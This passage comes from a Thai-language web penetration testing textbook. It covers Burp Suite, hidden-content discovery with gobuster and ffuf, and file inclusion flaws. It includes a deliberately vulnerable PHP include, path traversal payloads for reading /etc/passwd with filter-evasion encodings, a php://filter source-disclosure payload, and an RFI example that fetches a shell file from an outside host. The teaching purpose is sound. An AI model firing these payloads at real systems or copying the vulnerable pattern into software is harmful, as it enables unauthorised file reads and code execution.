Proxy กับ Intercept มักถูกเข้าใจว่าเป็นอย่างเดียวกัน ความจริงคือ Proxy เป็นตัวรับส่งทั้งหมด ส่วน Intercept เป็นสวิตช์ที่บอกว่าจะหยุดคำขอไว้ให้แก้หรือปล่อยผ่านทันที การปิด intercept ไม่ได้ทำให้พร็อกซีหยุดทำงาน คำขอยังถูกบันทึกใน HTTP history ตามปกติ

Repeater เป็นเครื่องมือที่ใช้เวลามากที่สุดในงานทดสอบเว็บ เพราะมันทำให้ผู้ทดสอบแก้คำขอเดิมแล้วส่งซ้ำได้ไม่จำกัด พร้อมเห็นคำตอบใหม่ทันที การทดสอบ LFI การอัปโหลดไฟล์ และการปรับค่าในคุกกี้ ล้วนอาศัยการส่งซ้ำแบบนี้ทั้งสิ้น

Proxy และ Intercept ในทางปฏิบัติ

เมื่อเปิด intercept คำขอแรกที่เบราว์เซอร์ส่งจะถูกหยุดไว้ที่ Burp ผู้ใช้สามารถแก้ไขบรรทัดคำขอ หัวข้อ หรือตัวข้อมูลได้ตามต้องการ แล้วจึงกดส่งต่อ หากไม่ต้องการให้คำขอนั้นไปถึงเซิร์ฟเวอร์เลย ก็สามารถทิ้งคำขอได้

การแก้ไขคำขอเป็นจุดที่การทดสอบเริ่มต้นจริง เพราะมันทำให้ผู้ทดสอบเปลี่ยนค่าใดค่าหนึ่งโดยที่ส่วนอื่นคงเดิม ซึ่งเป็นวิธีเดียวที่จะรู้ว่าผลที่เปลี่ยนไปเกิดจากค่านั้นจริงหรือไม่ หากแก้หลายอย่างพร้อมกันแล้วผลเปลี่ยน ก็ไม่อาจสรุปได้ว่าอะไรเป็นสาเหตุ

ระหว่างสำรวจเว็บ ควรปิด intercept ไว้ เพราะการเปิดตลอดเวลาจะทำให้ทุกคำขอหยุดรอและเสียเวลามาก ให้ใช้ HTTP history ย้อนดูแทน แล้วเปิด intercept เฉพาะเมื่อเจอคำขอที่น่าสนใจ

Repeater และการทดลองอย่างเป็นระบบ

Repeater ทำให้การทดลองเป็นระบบขึ้น เพราะคำขอเดิมถูกเก็บไว้และส่งซ้ำได้ทันที วิธีใช้ที่มีประสิทธิภาพคือเปลี่ยนค่าทีละตัว แล้วสังเกตความแตกต่างของคำตอบ ทั้งรหัสสถานะ ความยาว เนื้อหา และเวลาที่ใช้

ตัวอย่างเช่น เมื่อสงสัยว่าพารามิเตอร์ page ใช้กำหนดไฟล์ที่จะแสดง ให้เปลี่ยนเป็นค่าธรรมดาก่อนหนึ่งครั้ง บันทึกคำตอบไว้ แล้วเปลี่ยนเป็นค่าที่ไม่ควรมีอยู่ในระบบ หากคำตอบเปลี่ยนอย่างมีนัยสำคัญ เช่น แสดงเนื้อหาของไฟล์อื่นหรือข้อความผิดพลาดที่บอกเส้นทางไฟล์ นั่นคือจุดตั้งต้นของการทดสอบ LFI ที่จะกล่าวถึงในหัวข้อ 6.5

การบันทึกคำตอบเดิมไว้สำคัญมาก เพราะการเปรียบเทียบต้องมีฐานอ้างอิง หากไม่บันทึกไว้ ผู้ทดสอบจะจำไม่ได้ว่าคำตอบปกติหน้าตาเป็นอย่างไร และอาจตีความความแตกต่างเล็กๆ ผิดไป

Scope และวินัยการทดสอบ

การตั้ง scope มีประโยชน์สองอย่าง อย่างแรกคือกรอง HTTP history ให้เหลือเฉพาะคำขอที่อยู่ในขอบเขต ซึ่งทำให้หาเรื่องที่สนใจได้เร็วขึ้น อย่างที่สองคือเตือนสติผู้ทดสอบเมื่อเผลอส่งคำขอไปยังโดเมนอื่น

สิ่งสำคัญที่ต้องเข้าใจคือ scope ของ Burp ไม่ได้บล็อกคำขอออกนอกขอบเขต มันเป็นเพียงตัวกรองและตัวเตือน ความรับผิดชอบในการไม่ทดสอบนอกขอบเขตจึงยังอยู่ที่ผู้ทดสอบ ไม่ใช่ที่เครื่องมือ

อีกเรื่องที่ควรสร้างเป็นกิจนิสัยคือการจดบันทึก เนื่องจากรุ่นชุมชนไม่สามารถบันทึกโปรเจกต์ได้เต็มรูปแบบเหมือนรุ่นเชิงพาณิชย์ ผู้ทดสอบจึงควรเก็บคำขอและคำตอบสำคัญไว้ในบันทึกของตัวเอง หรือส่งออกเป็นไฟล์ข้อความก่อนปิดโปรแกรม

ข้อจำกัดของรุ่นชุมชนและทางเลือกอื่น

รุ่นชุมชนของ Burp ให้เครื่องมือหลักครบสำหรับงานในบทนี้ แต่มีข้อจำกัดที่ต้องรู้ก่อนวางแผน ข้อแรกคือไม่มีตัวสแกนช่องโหว่อัตโนมัติ ซึ่งไม่ใช่ปัญหาเพราะบทนี้เน้นการทดสอบด้วยมือ ข้อที่สองคือ Intruder ถูกจำกัดความเร็ว ซึ่งทำให้การทดสอบด้วยรายการคำยาวๆ ใช้เวลามาก ข้อที่สามคือไม่สามารถบันทึกและเปิดโปรเจกต์กลับมาทำต่อได้เต็มรูปแบบ

เมื่อต้องส่งคำขอจำนวนมากหรือต้องการทำงานอัตโนมัติ เครื่องมือบรรทัดคำสั่งอย่าง curl หรือเครื่องมือค้นหาเนื้อหาอย่าง gobuster และ ffuf จึงเหมาะกว่า เพราะเร็วและเขียนเป็นสคริปต์ได้ ส่วน Burp เหมาะกับการทดลองที่ต้องใช้การตัดสินใจของมนุษย์ในทุกขั้น

ทางเลือกอื่นที่มีแนวคิดเดียวกันได้แก่ OWASP ZAP ซึ่งเป็นเครื่องมือเปิดเผยโค้ดและมีความสามารถใกล้เคียงกัน และเครื่องมือในเบราว์เซอร์ซึ่งใช้ตรวจคำขอและคำตอบได้ในระดับหนึ่งแต่แก้ไขและส่งซ้ำได้ไม่สะดวกเท่า การเลือกใช้จึงขึ้นกับงานและข้อจำกัดของสภาพแวดล้อม

ไม่ว่าจะใช้เครื่องมือใด หลักการเดียวกันยังคงอยู่ นั่นคือผู้ทดสอบต้องเห็นคำขอจริง แก้ได้ทีละค่า และเปรียบเทียบคำตอบกับฐานอ้างอิงได้ เครื่องมือเป็นเพียงผู้ช่วยทำตามหลักการนี้ให้เร็วขึ้น

6.4 การค้นหาเนื้อหาที่ซ่อนอยู่

เนื้อหาที่ซ่อนอยู่คืออะไร

เว็บแอปพลิเคชันจริงมีไฟล์และเส้นทางมากกว่าที่ปรากฏเป็นลิงก์บนหน้าแรกเสมอ บางส่วนเป็นหน้าที่ต้องเข้าสู่ระบบก่อน บางส่วนเป็นหน้าสำหรับผู้ดูแลระบบ บางส่วนเป็นไฟล์ที่ผู้พัฒนาสร้างขึ้นระหว่างทำงานและลืมลบ และบางส่วนเป็นเส้นทางที่ถูกยกเลิกการใช้งานแล้วแต่ยังทำงานอยู่

การค้นหาเนื้อหา (Content Discovery) คือกระบวนการหาสิ่งเหล่านี้อย่างเป็นระบบ โดยอาศัยรายการคำที่เตรียมไว้ การคาดเดาจากสิ่งที่เห็น และการอ่านข้อมูลที่เว็บเปิดเผยโดยไม่ตั้งใจ ผลลัพธ์ที่ได้ไม่ใช่ช่องโหว่โดยตรง แต่เป็นแผนที่ของพื้นที่ที่อาจมีช่องโหว่

ความสำคัญของการค้นหาอยู่ที่ข้อเท็จจริงง่ายๆ ว่า ผู้ทดสอบไม่สามารถโจมตีสิ่งที่มองไม่เห็นได้ หน้าเข้าสู่ระบบที่ซ่อนอยู่ ไฟล์สำรองของโค้ด หรือไดเรกทอรีที่เปิดรายการไฟล์ได้ ล้วนเป็นจุดที่ให้ข้อมูลมากกว่าหน้าทั่วไปหลายเท่า

จุดเริ่มต้นที่ไม่ต้องใช้รายการคำ

ก่อนยิงรายการคำนับพันเข้าไป ควรอ่านสิ่งที่เว็บเปิดเผยอยู่แล้วก่อน เพราะข้อมูลเหล่านี้ได้มาฟรีและแม่นยำกว่ารายการคำทั่วไปมาก

จุดแรกคือ robots.txt ซึ่งเป็นไฟล์ที่บอกโปรแกรมค้นหาว่าไม่ควรเก็บหน้าใด ไฟล์นี้ไม่ได้ป้องกันการเข้าถึงแต่อย่างใด มันเป็นเพียงคำขอร้อง และการที่มีบรรทัดห้ามไว้กลับบอกผู้ทดสอบว่าเจ้าของเว็บไม่อยากให้ใครเห็นอะไร

User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /tmp/

ไฟล์ข้างต้นไม่ได้ให้สิทธิ์อะไร แต่ให้เบาะแสสามอย่างที่อาจมีค่ามากกว่าการสแกนทั้งวัน การทดสอบจึงควรเริ่มจากรายการที่ระบุไว้ในไฟล์นี้เสมอ

จุดที่สองคือ sitemap.xml ซึ่งมักมีรายการเส้นทางทั้งหมดที่เจ้าของเว็บต้องการให้ค้นหาเห็น แม้จะไม่ได้รวมหน้าที่ซ่อนไว้ แต่ก็ช่วยให้เห็นโครงสร้างและศัพท์ที่ใช้ตั้งชื่อเส้นทาง ซึ่งนำไปใช้สร้างรายการคำเฉพาะสำหรับเว็บนี้ได้

จุดที่สามคือความคิดเห็นในโค้ด HTML และไฟล์ JavaScript ผู้พัฒนามักเขียนหมายเหตุไว้ เช่น ที่อยู่ของสภาพแวดล้อมทดสอบ ชื่อผู้พัฒนาที่ใช้ตั้งชื่อไฟล์ หรือเส้นทางที่ยังทำไม่เสร็จ ไฟล์ JavaScript ยังอาจมีไฟล์แผนที่ (Source Map) ซึ่งเปิดเผยโค้ดต้นฉบับทั้งไฟล์หากถูกเผลอ deploy ขึ้นเซิร์ฟเวอร์

จุดที่สี่คือการถามความสามารถของเซิร์ฟเวอร์ด้วยวิธี OPTIONS ซึ่งบอกว่าวิธีใดที่เส้นทางนั้นรองรับ การเห็นวิธีที่ไม่คาดคิด เช่น PUT หรือ DELETE เป็นสัญญาณว่าอาจมีส่วนที่ไม่ได้ออกแบบไว้สำหรับผู้ใช้ทั่วไป

ไฟล์ที่มักหลงเหลืออยู่

ไฟล์ที่หลงเหลือคือผลพลอยได้จากการทำงานประจำวันของผู้พัฒนา บ่อยครั้งเป็นไฟล์ที่ช่วยให้ทำงานเร็วขึ้นแต่ไม่ควรอยู่บนเซิร์ฟเวอร์จริง ตารางถัดไปรวบรวมสิ่งที่พบบ่อยที่สุด

ตาราง 6.9 ไฟล์และไดเรกทอรีที่มักหลงเหลือบนเซิร์ฟเวอร์
ไฟล์หรือไดเรกทอรีสิ่งที่มักมีความเสี่ยง
.git/HEADข้อมูลคลังโค้ดของ Gitอาจดึงโค้ดทั้งคลังกลับมาได้
.svn/entriesข้อมูลคลังโค้ดของ Subversionเผยรายชื่อไฟล์และรุ่น
.DS_Storeข้อมูลการจัดหน้าต่างของ macOSเผยรายชื่อไฟล์ในไดเรกทอรี
.envค่าตั้งสภาพแวดล้อมมักมีรหัสผ่านและคีย์
phpinfo.phpหน้าข้อมูลระบบของ PHPเผยเส้นทาง ค่าตั้ง และส่วนขยาย
test.phpไฟล์ทดสอบที่ลืมลบอาจมีโค้ดที่ยังไม่ผ่านการตรวจ
web.configค่าตั้งเซิร์ฟเวอร์ของ IISเผยค่าตั้งและอาจมีข้อมูลรับรอง

ไฟล์สำรองของโค้ดเป็นเป้าหมายที่มีค่าที่สุดในกลุ่มนี้ เพราะมันมักเก็บโค้ดรุ่นก่อนการแก้ไข ซึ่งอาจมีรหัสผ่านที่ถูกถอดออกแล้วในรุ่นใหม่ แต่ยังคงอยู่ในไฟล์สำรอง การรู้ชื่อไฟล์หลักจึงช่วยให้เดาชื่อไฟล์สำรองได้ทันที

ตาราง 6.10 นามสกุลและรูปแบบของไฟล์สำรองที่ควรลอง
รูปแบบตัวอย่างหมายเหตุ

ต่อท้ายด้วยเครื่องหมาย tildeindex.php~เกิดจากโปรแกรมแก้ไขข้อความบางตัว

การลองนามสกุลเหล่านี้ทำได้ด้วยรายการคำที่ผสมชื่อไฟล์ที่รู้จักเข้ากับนามสกุลสำรอง หรือใช้เครื่องมือที่รองรับการแทนที่สองตำแหน่งพร้อมกัน วิธีหลังมีประสิทธิภาพกว่ามากเมื่อต้องลองหลายชื่อกับหลายนามสกุล

การเลือกรายการคำ

รายการคำ (Wordlist) คือหัวใจของการค้นหาเนื้อหา คุณภาพของรายการคำมีผลต่อผลลัพธ์มากกว่าความเร็วของเครื่องมือ รายการที่ยาวเกินไปจะทำให้เสียเวลาและสร้างเสียงรบกวนบนเครือข่าย ส่วนรายการที่สั้นเกินไปจะทำให้พลาดเส้นทางสำคัญ

รายการคำที่มาพร้อมเครื่องมือมักมีขนาดเล็กและครอบคลุมชื่อทั่วไป เช่น common.txt ของชุด dirb ซึ่งมีประมาณสี่พันหกร้อยบรรทัด เหมาะกับการสำรวจเบื้องต้นหรือระบบที่มีเวลาจำกัด

รายการคำขนาดใหญ่ที่นิยมใช้ในการทดสอบมีอยู่ในชุด SecLists ซึ่งแบ่งตามหมวดหมู่และขนาด ตัวอย่างเช่นรายการสำหรับไดเรกทอรีขนาดกลางมีประมาณสองแสนบรรทัด การใช้รายการขนาดนี้ต้องคำนึงถึงเวลาและภาระบนเซิร์ฟเวอร์เป้าหมาย เพราะคำขอสองแสนครั้งไม่ใช่เรื่องเล็กสำหรับระบบขนาดเล็ก

นอกจากรายการสำเร็จรูปแล้ว ควรสร้างรายการเฉพาะสำหรับเว็บนั้นด้วย โดยเก็บคำศัพท์จากชื่อเส้นทางที่เห็น ชื่อผลิตภัณฑ์ ชื่อแผนก และคำที่ปรากฏในเนื้อหา เว็บขององค์กรหนึ่งมักใช้ศัพท์เฉพาะที่รายการทั่วไปไม่มี การเพิ่มคำเหล่านี้เข้าไปจะเพิ่มโอกาสพบเส้นทางที่ซ่อนอยู่มาก

gobuster และ ffuf

เครื่องมือสองตัวที่ใช้บ่อยที่สุดในงานนี้มีแนวคิดคล้ายกัน แต่ถนัดต่างกัน ตารางถัดไปเปรียบเทียบคุณสมบัติหลัก

ตาราง 6.11 เปรียบเทียบ gobuster และ ffuf
ประเด็นgobusterffuf
จุดเด่นใช้งานง่าย คำสั่งสั้นยืดหยุ่นและปรับแต่งได้ละเอียด
โหมดที่ใช้บ่อยdir, dns, vhostแทนที่คำในที่อยู่ หัวข้อ หรือตัวข้อมูล
ตัวกรองผลตามรหัสสถานะและความยาวตามรหัส ขนาด จำนวนคำ และจำนวนบรรทัด
ความเร็วปรับจำนวนเธรดได้ปรับจำนวนเธรดและอัตราคำขอได้
เหมาะกับการสำรวจไดเรกทอรีและโดเมนย่อยการทดลองที่ต้องควบคุมเงื่อนไขหลายอย่าง

คำสั่งพื้นฐานของ gobuster ในการค้นหาไดเรกทอรีมีรูปแบบดังนี้

gobuster dir -u http://shop.example.local \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 20

ตัวเลือก -x บอกให้ลองนามสกุลที่กำหนดต่อท้ายคำแต่ละคำ ซึ่งเพิ่มจำนวนคำขอเป็นสามเท่าในตัวอย่างนี้ ตัวเลือก -t กำหนดจำนวนเธรด การตั้งค่าสูงเกินไปจะทำให้เซิร์ฟเวอร์เป้าหมายรับภาระหนักและอาจทำให้ระบบป้องกันตัดการเชื่อมต่อ

คำสั่งเดียวกันด้วย ffuf มีรูปแบบที่ให้ควบคุมผลลัพธ์ได้มากกว่า

ffuf -u http://shop.example.local/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -mc 200,204,301,302,403 -t 40

เครื่องหมาย FUZZ คือตำแหน่งที่เครื่องมือจะแทนที่ด้วยคำจากรายการ ตัวเลือก -mc กำหนดรหัสสถานะที่ถือว่าเป็นผลที่ต้องการเห็น การกำหนดเช่นนี้ช่วยลดจำนวนบรรทัดที่ต้องอ่านด้วยตนเอง

ffuf ยังสามารถแทนที่คำในหัวข้อหรือตัวข้อมูลได้ เช่น การทดสอบค่าพารามิเตอร์หรือชื่อผู้ใช้ ซึ่งทำให้มันมีประโยชน์เกินกว่าการค้นหาไดเรกทอรี แต่ในบทนี้จะใช้เพียงความสามารถพื้นฐานเพื่อไม่ให้ซับซ้อนเกินไป

การตีความผลและลดผลบวกลวง

ปัญหาที่พบบ่อยที่สุดของการค้นหาเนื้อหาคือผลบวกลวงจากหน้า 404 ที่กำหนดเอง เว็บจำนวนมากตอบ 200 OK พร้อมหน้าแสดงข้อความว่าไม่พบหน้า ซึ่งทำให้เครื่องมือรายงานว่าทุกเส้นทางมีอยู่จริง

วิธีแก้คือหาขนาดของคำตอบปกติก่อน โดยขอเส้นทางที่ไม่มีทางมีอยู่จริง เช่น สายอักขระสุ่มยาวๆ แล้วบันทึกขนาดของคำตอบ จากนั้นใช้ตัวกรองขนาดเพื่อตัดผลที่ใกล้เคียงกับค่านี้ออก

ffuf -u http://shop.example.local/FUZZ \
  -w wordlist.txt -fs 1240

ตัวเลือก -fs ตัดผลที่มีขนาด 1240 ไบต์ออก ซึ่งในตัวอย่างนี้คือขนาดของหน้า 404 ที่กำหนดเอง หากหน้า 404 มีขนาดเปลี่ยนเล็กน้อยตามเส้นทางที่ขอ อาจต้องกรองด้วยจำนวนคำหรือจำนวนบรรทัดแทน

รหัสสถานะแต่ละตัวมีความหมายต่างกันในบริบทนี้ 200 หมายถึงเข้าถึงได้ 301 และ 302 มักหมายถึงไดเรกทอรีที่มีอยู่และกำลังเปลี่ยนเส้นทางไปยังรูปแบบที่ลงท้ายด้วยเครื่องหมายทับ 403 หมายถึงมีอยู่แต่ถูกห้ามเข้าถึง ซึ่งยังมีค่าเพราะบอกว่ามีอะไรบางอย่างอยู่ตรงนั้น ส่วน 401 หมายถึงต้องยืนยันตัวตนก่อน

การเห็น 429 บ่อยครั้งเป็นสัญญาณว่าระบบจำกัดอัตราคำขอและกำลังตัดการเชื่อมต่อ การฝืนส่งต่อด้วยความเร็วเดิมจะทำให้ถูกบล็อกนานขึ้น วิธีที่ถูกต้องคือลดจำนวนเธรด เพิ่มระยะห่างระหว่างคำขอ และกลับมาทำต่อเมื่อระบบผ่อนปรน

ขอบเขตและผลข้างเคียง

การค้นหาเนื้อหาสร้างคำขอจำนวนมากในเวลาสั้น ซึ่งต่างจากการใช้งานปกติอย่างชัดเจน ระบบเฝ้าระวังสมัยใหม่จึงตรวจจับได้ไม่ยาก และอาจตอบโต้ด้วยการบล็อกหมายเลขผู้ทดสอบชั่วคราวหรือแจ้งเตือนผู้ดูแลระบบ

ก่อนเริ่มควรตรวจสอบว่าขอบเขตอนุญาตให้สแกนแบบอัตโนมัติหรือไม่ และควรแจ้งผู้ดูแลระบบล่วงหน้าหากเป็นระบบที่สำคัญต่อธุรกิจ การทดสอบที่สร้างความเสียหายให้ระบบทำงานไม่ได้นั้นไม่ใช่การทดสอบที่ดี แม้จะพบช่องโหว่ก็ตาม

อีกเรื่องที่ต้องระวังคือการค้นหาอาจไปพบหน้าที่ไม่ควรเข้าถึง เช่น หน้าจัดการของผู้ดูแลระบบ หรือไฟล์ที่มีข้อมูลส่วนบุคคล การเห็นข้อมูลเหล่านั้นในผลการค้นหาไม่ได้หมายความว่าอนุญาตให้เปิดอ่าน ในกรณีเช่นนี้ควรหยุดและปรึกษาผู้ว่าจ้างก่อนดำเนินการต่อ

เมื่อพบเส้นทางที่น่าสนใจ ควรกลับไปใช้ Burp เพื่อดูคำขอและคำตอบอย่างละเอียด ไม่ควรสรุปจากผลของเครื่องมือค้นหาเพียงอย่างเดียว เพราะผลนั้นบอกเพียงว่ามีอะไรอยู่ ไม่ได้บอกว่ามันทำงานอย่างไร

6.5 การอ้างอิงไฟล์และการอ่านไฟล์ระบบ

กลไกที่ทำให้เกิดช่องโหว่

ภาษาโปรแกรมฝั่งเซิร์ฟเวอร์ทุกภาษามีความสามารถในการดึงไฟล์อื่นมาร่วมทำงาน เพื่อไม่ให้ผู้พัฒนาต้องเขียนโค้ดซ้ำในทุกหน้า กลไกนี้มีชื่อเรียกต่างกันตามภาษา เช่น include ใน PHP, require ใน Ruby, การนำเข้าโมดูลใน Python หรือคำสั่ง <%@ include %> ใน JSP

ตัวอย่างที่แพร่หลายที่สุดอยู่ใน PHP ซึ่งมักใช้สร้างหน้าเว็บจากแม่แบบ

<?php
$page = $_GET['page'];
include("pages/" . $page . ".php");
?>

โค้ดข้างต้นตั้งใจให้ผู้ใช้เรียก ?page=about แล้วระบบจะเปิดไฟล์ pages/about.php ปัญหาคือค่า $page มาจากผู้ใช้โดยไม่ผ่านการตรวจสอบใดๆ ผู้ใช้จึงส่งค่าอะไรก็ได้ และโค้ดจะนำค่านั้นต่อเข้ากับเส้นทางแล้วเปิดไฟล์ตามที่ผู้ใช้กำหนด

ช่องโหว่ลักษณะนี้เรียกว่า การอ้างอิงไฟล์ฝั่งเซิร์ฟเวอร์ (File Inclusion) และแบ่งเป็นสองชนิดตามแหล่งของไฟล์ คือการอ้างอิงไฟล์ภายในเครื่อง (Local File Inclusion หรือ LFI) ซึ่งไฟล์อยู่ในเซิร์ฟเวอร์เดียวกัน และการอ้างอิงไฟล์จากระยะไกล (Remote File Inclusion หรือ RFI) ซึ่งไฟล์อยู่บนเซิร์ฟเวอร์อื่นที่ผู้โจมตีควบคุม

สิ่งที่ทำให้ช่องโหว่นี้อันตรายกว่าการอ่านไฟล์ทั่วไปคือไฟล์ที่ถูกอ้างอิงจะถูกส่งให้ตัวแปลภาษาประมวลผล ไม่ใช่เพียงอ่านออกมาเป็นข้อความ หากไฟล์ที่อ้างอิงมีโค้ด PHP อยู่ โค้ดนั้นจะทำงานด้วยสิทธิ์ของเว็บเซิร์ฟเวอร์ทันที

Path Traversal คือประตูที่เปิดกว้าง

ก่อนจะไปถึงการประมวลผลโค้ด ต้องเข้าใจกลไกพื้นฐานก่อน นั่นคือการเดินถอยหลังออกจากไดเรกทอรีที่ตั้งใจไว้ ในระบบไฟล์ทุกชนิด เครื่องหมาย .. หมายถึงไดเรกทอรีระดับบน ดังนั้นเส้นทาง ../../etc/passwd จึงหมายถึงถอยขึ้นสองระดับแล้วเข้าไปที่ etc/passwd

หากโค้ดตั้งต้นที่ /var/www/html/app/pages/ การส่งค่า ../../../../etc/passwd จะพาไปถึง /etc/passwd พอดี จำนวน ../ ที่ต้องใช้ขึ้นกับความลึกของไดเรกทอรีเริ่มต้น ผู้ทดสอบจึงมักส่งหลายระดับเกินไว้ก่อน แล้วลดลงทีละระดับเมื่อพบว่าอ่านไฟล์ได้

ตาราง 6.12 ตัวอย่างค่าที่ใช้ทดสอบ Path Traversal และเป้าหมาย
ค่าที่ส่งเป้าหมายระบบที่ใช้
../../../../etc/passwdบัญชีผู้ใช้ของระบบลินุกซ์
....//....//....//etc/passwdหลบตัวกรองที่ลบ ../ลินุกซ์
..%2f..%2f..%2fetc%2fpasswdหลบตัวกรองในชั้นถอดรหัสที่อยู่ลินุกซ์
..%252f..%252fetc%252fpasswdหลบตัวกรองที่ถอดรหัสสองครั้งลินุกซ์
/etc/passwdระบุเส้นทางเต็มโดยตรงลินุกซ์

ไฟล์ /etc/passwd เป็นเป้าหมายแรกที่ทุกคนลองเพราะมีอยู่แน่นอนในระบบลินุกซ์เกือบทุกเครื่อง และอ่านได้โดยผู้ใช้ทั่วไป ไฟล์นี้มีข้อมูลผู้ใช้บรรทัดละหนึ่งคน แต่ละบรรทัดแบ่งด้วยเครื่องหมายโคลอนเป็นเจ็ดส่วน ได้แก่ ชื่อผู้ใช้ รหัสผ่านที่เก็บที่อื่น หมายเลขผู้ใช้ หมายเลขกลุ่ม คำอธิบาย ไดเรกทอรีบ้าน และเชลล์เริ่มต้น

การอ่านไฟล์นี้ไม่ได้ให้รหัสผ่านโดยตรง เพราะระบบใหม่เก็บรหัสผ่านที่เข้ารหัสไว้ใน /etc/shadow ซึ่งอ่านได้เฉพาะผู้ใช้ระดับสูง แต่สิ่งที่ได้กลับมีค่ามากในขั้นถัดไป นั่นคือรายชื่อบัญชีจริงของระบบ และการยืนยันว่าช่องโหว่นี้ใช้งานได้จริง

ความต่างระหว่าง Path Traversal กับ LFI

สองคำนี้มักถูกใช้ปนกัน แต่ความหมายต่างกันชัดเจน Path Traversal คือความสามารถในการเข้าถึงไฟล์นอกไดเรกทอรีที่กำหนด ซึ่งอาจเกิดกับฟีเจอร์ดาวน์โหลดไฟล์ ฟีเจอร์แสดงรูป หรือฟีเจอร์อ่านแม่แบบ โดยไม่จำเป็นต้องมีการประมวลผลโค้ดเลย

LFI คือการที่ไฟล์ที่ผู้ใช้เลือกถูกนำไปรวมเข้ากับสคริปต์และประมวลผล ผลลัพธ์จึงไม่ใช่แค่การเห็นเนื้อหาไฟล์ แต่เป็นโอกาสที่โค้ดในไฟล์นั้นจะทำงาน

ในทางปฏิบัติ ช่องโหว่เดียวกันอาจให้ผลได้ทั้งสองแบบ ขึ้นกับว่าโค้ดใช้ include หรือใช้ file_get_contents หากเป็นการอ่านเฉยๆ ผู้ทดสอบได้เพียงข้อมูล หากเป็นการรวมไฟล์ ผู้ทดสอบอาจได้การสั่งให้ระบบทำงาน

การอ่านซอร์สโค้ดด้วยตัวห่อของ PHP

การอ้างอิงไฟล์ PHP ตามปกติจะทำให้ไฟล์ถูกประมวลผล ผลลัพธ์ที่ได้จึงเป็น HTML ที่สร้างขึ้น ไม่ใช่โค้ดต้นฉบับ ซึ่งไม่เป็นประโยชน์เมื่อผู้ทดสอบต้องการอ่านตรรกะของแอปพลิเคชันหรือหาข้อมูลรับรองที่ฝังไว้

PHP มีตัวห่อ (Wrapper) ที่เปลี่ยนวิธีการเข้าถึงไฟล์ ตัวที่สำคัญที่สุดคือ php://filter ซึ่งให้กรองข้อมูลก่อนหรือหลังการอ่าน การใช้ร่วมกับการเข้ารหัสฐานหกสิบสี่จะทำให้ได้โค้ดต้นฉบับออกมาเป็นข้อความที่ถอดกลับได้ทันที

?page=php://filter/convert.base64-encode/resource=index

ค่าข้างต้นสั่งให้ PHP อ่านไฟล์ index.php เข้ารหัสเป็นฐานหกสิบสี่ แล้วจึงส่งผลลัพธ์กลับมา เนื้อหาที่ได้จะไม่ถูกประมวลผลเป็น PHP เพราะผ่านตัวกรองก่อน ผู้ทดสอบเพียงนำผลลัพธ์ไปถอดรหัสก็จะได้โค้ดต้นฉบับครบทั้งไฟล์

ตัวห่อ data:// และ expect:// ต้องเปิดค่าตั้งที่ปิดไว้โดยปริยายใน PHP รุ่นใหม่ ค่า allow_url_include มีค่าเริ่มต้นเป็นปิด ซึ่งหมายความว่า RFI และการใช้ data:// จะไม่ทำงานบนระบบที่ตั้งค่าตามมาตรฐาน ส่วน allow_url_fopen ซึ่งควบคุมการเปิดไฟล์จากระยะไกล ยังมีค่าเริ่มต้นเป็นเปิดในหลายระบบ จึงควรตรวจค่านี้ก่อนสรุปว่า RFI ทำได้หรือไม่

RFI และเงื่อนไขที่ต้องมี

RFI เกิดขึ้นเมื่อค่าที่ผู้ใช้ส่งไปถูกใช้เป็นเส้นทางแบบเต็มพร้อมชื่อเซิร์ฟเวอร์ เช่น ?page=http://192.0.2.10/shell.txt เซิร์ฟเวอร์เป้าหมายจะไปดึงไฟล์จากเครื่องผู้โจมตีแล้วนำมาประมวลผล หากไฟล์นั้นมีโค้ด PHP โค้ดจะทำงานบนเซิร์ฟเวอร์เป้าหมายทันที

RFI อันตรายกว่า LFI เพราะผู้โจมตีควบคุมเนื้อหาไฟล์ได้เต็มที่ ไม่ต้องอาศัยการเขียนไฟล์ลงในระบบเป้าหมายก่อน แต่ก็พบน้อยกว่า เพราะต้องเปิด allow_url_include ซึ่งผู้ให้บริการโฮสติ้งส่วนใหญ่ปิดไว้แล้ว

ข้อสังเกตที่สำคัญคือไฟล์ที่ดึงมาจะถูกประมวลผลในบริบทของเซิร์ฟเวอร์เป้าหมาย ไม่ใช่ของผู้โจมตี โค้ดจึงทำงานด้วยสิทธิ์ของเว็บเซิร์ฟเวอร์และเข้าถึงไฟล์ของเป้าหมายได้ การทดสอบในห้องปฏิบัติการควรใช้เครื่องเสมือนที่แยกเครือข่ายและใช้เซิร์ฟเวอร์ของผู้ทดสอบเองเป็นแหล่งไฟล์เท่านั้น

ข้อจำกัดที่ทำให้ LFI ใช้ไม่ได้

การเห็นข้อความผิดพลาดว่าไม่สามารถเปิดไฟล์ได้ ไม่ได้หมายความว่าช่องโหว่ไม่มี แต่หมายความว่ามีสิ่งกีดขวางบางอย่าง ตารางถัดไปสรุปข้อจำกัดที่พบบ่อยและอาการที่สังเกตได้

ตาราง 6.14 ข้อจำกัดของ LFI และอาการที่สังเกตได้
ข้อจำกัดอาการที่เห็นแนวทางตรวจต่อ

ตรวจเส้นทางแบบเข้มงวดค่าที่มี ../ ถูกปฏิเสธทันทีลองรูปแบบเข้ารหัสหรือรูปแบบที่ตัวกรองมองข้าม
จำกัดด้วย open_basedirเปิดไฟล์นอกไดเรกทอรีที่อนุญาตไม่ได้หาไฟล์ภายในไดเรกทอรีที่อนุญาตแทน
สิทธิ์ของไฟล์เปิดไฟล์ได้บางไฟล์เท่านั้นเลือกไฟล์ที่ผู้ใช้เว็บอ่านได้
ระบบควบคุมภาคบังคับเปิดไฟล์ได้แต่ถูกปฏิเสธการเข้าถึงตรวจนโยบายของ SELinux หรือ AppArmor
allow_url_include ปิดตัวห่อจากระยะไกลไม่ทำงานเปลี่ยนไปใช้ LFI ร่วมกับการเขียนไฟล์

การต่อนามสกุลอัตโนมัติเป็นข้อจำกัดที่พบบ่อยที่สุดในโค้ดตัวอย่าง เพราะโค้ดมักเขียนว่า include($page . ".php") ซึ่งทำให้ค่าที่ส่งไปถูกต่อท้ายด้วย .php เสมอ วิธีแก้ในระบบรุ่นเก่าคือการใส่อักขระ null byte ต่อท้ายค่า เพื่อให้ตัวจัดการสายอักขระของภาษาตีความว่าสายอักขระจบแล้ว แต่ช่องทางนี้ถูกปิดตั้งแต่ PHP 5.3.4 เป็นต้นมา

